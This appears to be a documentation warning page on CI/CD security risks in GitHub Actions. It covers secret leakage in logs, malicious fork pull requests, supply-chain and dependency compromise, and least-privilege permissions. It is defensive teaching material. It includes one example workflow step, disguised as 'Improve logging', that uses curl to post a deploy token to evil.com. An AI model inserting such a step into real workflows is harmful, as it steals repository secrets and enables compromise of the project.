---
type: "WARNING"
title: "CI/CD Security Risks"
---

## Secret Exposure in Logs

The most common security failure is accidentally printing secrets to workflow logs. GitHub masks secrets referenced directly, but secrets passed through variables, files, or command outputs can leak.

**Dangerous patterns:**
```yaml
# DANGER: Echoes the secret to logs
- run: echo "Database URL is ${{ secrets.DATABASE_URL }}"

# DANGER: Variable interpolation in connection string
- run: |
    CONNECTION="Server=prod;Password=${{ secrets.DB_PASSWORD }}"
    echo "Connecting with: $CONNECTION"  # Leaks password!

# DANGER: Debug output that includes environment
- run: env | sort  # Prints all env vars including secrets!

# DANGER: Error messages that include credentials
- run: curl https://user:${{ secrets.API_KEY }}@api.example.com || true
  # Failed curl shows URL with credentials in error output
```

**Safe patterns:**
```yaml
# SAFE: Use add-mask for dynamic secrets
- run: |
    TOKEN=$(some-command-that-returns-secret)
    echo "::add-mask::$TOKEN"
    use-token "$TOKEN"

# SAFE: Never echo, just use
- run: |
    curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" \
      https://api.example.com/data
```

## Fork Pull Request Attacks

When someone forks your repository and creates a pull request, their workflow modifications run in your repository context. A malicious PR could modify the workflow to exfiltrate secrets:

```yaml
# Malicious PR adds this step
- name: "Improve logging"
  run: |
    curl -X POST https://evil.com/steal \
      -d "token=${{ secrets.DEPLOY_TOKEN }}"
```

**Mitigations:**
1. Use `pull_request_target` carefully - it runs with repository secrets
2. Require approval for first-time contributors
3. Never use secrets in `pull_request` events from forks
4. Use environment protection rules requiring manual approval

## Supply Chain Vulnerabilities

GitHub Actions you reference are code that runs with your secrets:

```yaml
# This action has full access to your secrets!
- uses: random-author/cool-action@main
```

**Risks:**
- Action author could be compromised
- `@main` means you run whatever code is currently there
- Transitive dependencies in actions can be vulnerable

**Mitigations:**
```yaml
# Pin to specific commit SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

# Or use verified/official actions only
- uses: actions/checkout@v4  # GitHub-verified

# Audit action source code before using
# Check for data exfiltration, network calls to unknown hosts
```

## Compromised Dependencies

Your application dependencies can be compromised. A malicious package update could:
- Steal environment variables during build
- Inject malware into your built application
- Exfiltrate source code during `npm install` or `dotnet restore`

**Mitigations:**
1. Use lock files (`package-lock.json`, `packages.lock.json`)
2. Enable Dependabot security updates
3. Scan dependencies: `dotnet list package --vulnerable`
4. Use private package feeds for critical dependencies
5. Monitor for typosquatting attacks on package names

## Privilege Escalation

Overly permissive workflow permissions enable attacks:

```yaml
# DANGER: Full repository access for a simple build
permissions: write-all

# BETTER: Minimal required permissions
permissions:
  contents: read
  packages: write
```

A compromised step with `write-all` could push malicious code, delete branches, or modify releases. Always use the principle of least privilege.